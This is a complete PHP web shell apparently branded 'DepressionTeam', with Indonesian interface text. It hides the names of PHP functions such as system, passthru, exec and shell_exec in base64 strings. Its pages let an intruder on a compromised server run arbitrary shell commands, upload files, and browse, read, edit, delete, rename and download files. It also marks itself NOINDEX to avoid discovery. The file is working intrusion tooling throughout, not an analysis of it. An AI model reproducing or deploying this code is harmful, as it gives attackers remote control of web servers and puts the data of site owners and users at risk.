<?php
error_reporting(0);
/**
 *	@author LittleJok3r
 *	@version 1.0 Beta
 *	@link https://github.com/apaajalahx/webshell
 *	Responsive And No Load.
 *	Terinspirasi oleh MARIJUANA WEBSHELL
 *	@link https://github.com/0x5a455553/MARIJUANA
 *
 */
$apa = ["Z2V0Y3dk",
		"YmFzZW5hbWU=",
		"bW92ZV91cGxvYWRlZF9maWxl",
		"ZmlsZV9nZXRfY29udGVudHM=",
		"aXNfd3JpdGFibGU=",
		"aXNfcmVhZGFibGU=",
		"c2NhbmRpcg==",
		"aXNfZGly",
		"ZXhwbG9kZQ==",
		"c3RyX3JlcGxhY2U=",
		"ZmlsZXNpemU=",
		"ZmlsZXBlcm1z",
		"aXNfZmlsZQ==",
		"aHRtbHNwZWNpYWxjaGFycw==",
		"cHJlZ19tYXRjaA==",
		"cm1kaXI=",
		"dW5saW5r",
		"cGhwX3VuYW1l",
		"cmVuYW1l",
		"ZnVuY3Rpb25fZXhpc3Rz",
		"c3lzdGVt", /* system */
		"cGFzc3RocnU=", /* passthru */
		"ZXhlYw==",
		"c2hlbGxfZXhlYw==",
		"Zm9wZW4=", /* Fopen */
		"ZndyaXRl", /* Fwrite */
		"ZmNsb3Nl", /* Fclose */
		"b2JfY2xlYW4=", /* ob clean */
		"cmVhZGZpbGU=" /* readfile */
		];
	$f = count($apa);
	for($i=0;$i<=$f;$i++){
		$plr[] = dec($apa[$i]);
	}
	?>
<!DOCTYPE html>
<head>
	<title>DepressionTeam</title>
	<meta name="robots" content="NOINDEX, NOFOLLOW">
	<meta charset="utf-8">
	<meta lang="en-US">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script src="//ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<style> 
body {
	
  background:dodgerblue;
  line-height: 1;
  color: #fff;
  font-family:monospace;
  font-size:15px;

  }
  
table, th, td {

	border-collapse:collapse;
	background: transparent;
	font-family: monospace ;
	font-size: 13px;

}
input, textarea { font-family: monospace; }
.table_home, .th_home, .td_home {
	 color:green;
	border: 1px solid black;
}

th {
	padding: 10px;
}
.td_home { padding: 7px; }
.td_opsi { padding: 5px; border: 1px solid black; text-align: center;}
.th_opsi { padding: 5px; border: 1px solid black;}
.td_opsi2 { padding:3px; border:1px solid black; }
select {	font-family: monospace;}
a 	{
	text-decoration: none;
	color:white;
}
a:hover{
	color:red;
}
textarea {
			width: 100%;
			height: 50%;
		}
pre {
	width: 100%;
	height: 100%;
}
li {
	display: inline;
}
button {
	background-color: transparent;
}
.c{
	text-align: right;
	color: white;
	font-size: 15px;
	font-family: monospace;
}
</style>
	<script type="text/javascript">
function goBack() {
  window.history.back();
}
        </script>
</head>
<body><b>
<H1><center><a class="plr" href="<?php echo $plr[1]($_SERVER['PHP_SELF']); ?>">DepressionTeam</a></center></h1>
<br>
<font color="black">SYSTEM : <?php echo $plr[17]();?></font><br>
<table width="100%" border="0" cellpadding="3" cellspacing="1">
<?php
echo '<ul>';
echo '<li><a class="plr" href="?">HOME </a>|</li>';
echo '<li>|<a class="plr" href="?c"> CMD </a>|</li>';
echo '<li>|<a class="plr" href="?u"> UPL </a>|</li>';
echo '</ul>';
echo '<tr><td>Directory : ';
if(@dec($_GET['p'])){
	$p = dec($_GET['p']);
} else {
	$p = $plr[0]();
}

$p = $plr[9]('\\', '/', $p);
$ps = $plr[8]('/', $p);
foreach ($ps as $x=>$g) {

	if($g == '' && $x == 0){
	$a = true;
	echo '<a class="plr" href="?p=/">/</a>';
	continue;
	}
	if($g == '') continue;
	echo '<a class="plr" href="?p=';
	for($i=0;$i<=$x;$i++) { 
	echo enc("$ps[$i]/");
	if($i != $x) echo "";
	}
	echo '">'.$g.'</a>/';
}
echo '</td></tr><br>';
if($_GET['r']){
echo "<tr><td>File : ";
echo dec($_GET['r']);
echo '<br><br><font color="white">OPSI :</font><a class="plr" href="?d='.$_GET['r'].'"> DELETE </a>|<a class="plr" href="?e='.$_GET['r'].'"> EDIT </a>|<a class="plr" href="?dd='.$_GET['r'].'"> DOWNLOAD </a>';
echo '</tr></td></table><br />';
echo '<textarea style="width: 100%;height: 400px;" readonly> '.$plr[13]($plr[3](dec($_GET['r']))).'</textarea>';
}elseif(@$_GET['d']){
		if($plr[12](dec($_GET['d']))){
			if($plr[16](dec($_GET['d']))){
				echo "Sukses Delete File";
			}
		}
		if($plr[7](dec($_GET['d']))){
			if($plr[15](dec($_GET['d']))){
				echo "Sukses Delete Directory";
			}

		}
}elseif(@$_GET['re']){
	echo '<form method="POST" action=""><br>';
	echo '<input type="text" name="n">';
	echo '<input type="submit" name="submit" value="Rename"></form>';
	if(@$_POST['n']){
	if($plr[18](dec(@$_GET['re']), @$_POST['n'])){
		echo '<script>alert("Rename Sukses")</script>';
		#header("Location: ".$plr[1]($_SERVER['PHP_SELF']));
		} else {
		echo '<script>alert("Rename Failed")</script>';
		}
	}
} elseif(isset($_GET['c'])){
	echo '<form method="POST">';
	echo '<input type="text" name="cc">';
	echo '<input type="submit" value="Hajar"></form><br>';
	if(@$_POST['cc']){
	echo '<pre>'.cc($_POST['cc']).'</pre>';
	} else {
	echo '<pre></pre>';
	}
} elseif(isset($_GET['e'])){
	$s = $plr[24](dec($_GET['e']),'w+');
	echo '</table><br>File : '.dec($_GET['e']);
	echo '<form method="POST" action="">';
	echo '<textarea cols=80 rows=20 name="f">'.$plr[13]($plr[3](dec($_GET['e'])))."</textarea><br>";
	echo '<input type="submit" name="e" value="EDIT"></form>';
	if(@$_POST['e']){
	if(@$plr[25]($s,$_POST['f'])){
		echo '<script>alert("Sukses Edit File, Reload This for get result.")</script>';
	} else {
		echo '<script>alert("Gagal Edit File")</script>';
	}
	}
	$plr[26]($s);
} elseif(isset($_GET['u'])){
	echo '</table><form method="POST" enctype="multipart/form-data">';
	echo '<input type="file" name="f">';
	echo '<input type="submit" name="u" value="upload">';
	echo '</form>';
	if(@$_POST['u']){
		if(@$plr[2]($_FILES['f']['tmp_name'],$_FILES['f']['name'])){
			echo '<script>alert("Upload Sukses")</script>';
		} else {
			echo '<script>alert("Upload Gagal")</script>';
		}
	}
}elseif(isset($_GET['dd'])){
	/*
	 * Download Masih error, nanti tak fik
	*/
	@$plr[27];
	header('Content-Description: File Transfer');
	header('Content-Type: application/octet-stream');
	header('Content-Diposition: attachment;filename="'.$plr[1](dec($_GET['dd'].'"')));
	header('Expires: 0');
	header('Cache-Control: must-revalidate');
	header('Pragma: public');
	header('Content-Length:'.$plr[10](dec($_GET['dd'])));
	$plr[28](dec($_GET['dd']));
	exit;

} else {
	$halu = $plr[6]($p);
echo '<table width="100%" class="table_home" border="0" cellpadding="3" cellspacing="1" align="center">
	<tr>
	<th class=th_home style="background:black;color:white;"><center>NAMA</center></th>
	<th class=th_opsi style="background:black;color:white;"><center>PerMS</center></th>
	<th class=th_opsi style="background:black;color:white;"><center>OPSI</center></th>
	</tr><tr>'; 
foreach ($halu as $sdir) {
	if(!$plr[7]("$p/$sdir")) continue;
	echo '<tr><td class=td_home><a class="plr" href="?p='.enc("$p/$sdir").'">'.$sdir.'</a></td>';
	echo '<td class=td_opsi>'.perms("$p/$sdir").'</td></tr>';
}
	echo '<br>';
foreach ($halu as $sfile) {
	if(!$plr[12]("$p/$sfile")) continue;
	#echo '<td class=td_home>'.wr("$p/$sfile",);
	echo '<td class=td_home><a class="plr" href="?r='.enc("$p/$sfile").'">'.$sfile.'</a></td>';
	echo '<td class=td_opsi>'.perms("$p/$sfile");
	echo '<td class=td_opsi><a class="plr" href="?d='.enc("$p/$sfile").'"> D </a>';
	echo '<a class="plr" href="?re='.enc("$p/$sfile").'"> R </a></font></td></tr>';
}
}
function dec($d){
	$d = base64_decode($d);
	return $d;
}
function enc($d){
	$d = base64_encode($d);
	return $d;
}
function cc($c){
	global $plr;
	if($plr[19]($plr[20])){
		$c = $plr[20]($c);
	}
	elseif($plr[19]($plr[21])){
		$c = $plr[21]($c);
	}
	elseif($plr[19]($plr[22])){
		$c = $plr[22]($c);
	}
	elseif($plr[19]($plr[23])){
		$c = $plr[23]($c);
	}
	return $c;
}
    function perms($file){
    	global $plr;
      $perms = $plr[11]($file);
      if (($perms & 0xC000) == 0xC000) {
        $info = 's';
      } elseif (($perms & 0xA000) == 0xA000) {
        $info = 'l';
      } elseif (($perms & 0x8000) == 0x8000) {
        $info = '-';
      } elseif (($perms & 0x6000) == 0x6000) {
        $info = 'b';
      } elseif (($perms & 0x4000) == 0x4000) {
        $info = 'd';
      } elseif (($perms & 0x2000) == 0x2000) {
        $info = 'c';
      } elseif (($perms & 0x1000) == 0x1000) {
        $info = 'p';
      } else {
         $info = 'u';
      }
      $info .= (($perms & 0x0100) ? 'r' : '-');
      $info .= (($perms & 0x0080) ? 'w' : '-');
      $info .= (($perms & 0x0040) ?
      (($perms & 0x0800) ? 's' : 'x' ) :
      (($perms & 0x0800) ? 'S' : '-'));
      $info .= (($perms & 0x0020) ? 'r' : '-');
      $info .= (($perms & 0x0010) ? 'w' : '-');
      $info .= (($perms & 0x0008) ?
      (($perms & 0x0400) ? 's' : 'x' ) :
      (($perms & 0x0400) ? 'S' : '-'));
      $info .= (($perms & 0x0004) ? 'r' : '-');
      $info .= (($perms & 0x0002) ? 'w' : '-');
      $info .= (($perms & 0x0001) ?
      (($perms & 0x0200) ? 't' : 'x' ) :
      (($perms & 0x0200) ? 'T' : '-'));
      return $info;
    }
  ?>

      <script>
        $(".plr").click(function(t){
          t.preventDefault();
          var e=$(this).attr("href");
          history.pushState("","",e),
          $.get(e,function(t){
            $("body").html(t)
          })
        });
    </script>
   </table>
   </html>
